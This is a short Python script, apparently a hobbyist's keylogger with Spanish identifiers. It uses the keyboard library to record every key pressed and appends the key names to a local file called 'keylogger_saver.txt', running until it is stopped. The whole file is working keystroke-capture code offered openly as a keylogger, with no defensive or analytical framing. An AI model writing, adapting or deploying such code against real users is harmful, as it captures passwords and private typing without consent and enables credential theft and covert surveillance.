import keyboard
keys = []
def presionar_tecla(key):
	with open('keylogger_saver.txt','a') as file:

		if key.name =="space":
			file.write(' ')
		elif key.name =="ctrl":
			file.write('')
		elif key.name =="backspace":
			file.write('')
		elif key.name =="mayusculas":
			file.write('')
		elif key.name =="enter":
			file.write('')
		elif key.name =="bloq mayusc":
			file.write('')
		else:
			file.write(key.name)
keyboard.on_press(presionar_tecla)
keyboard.wait()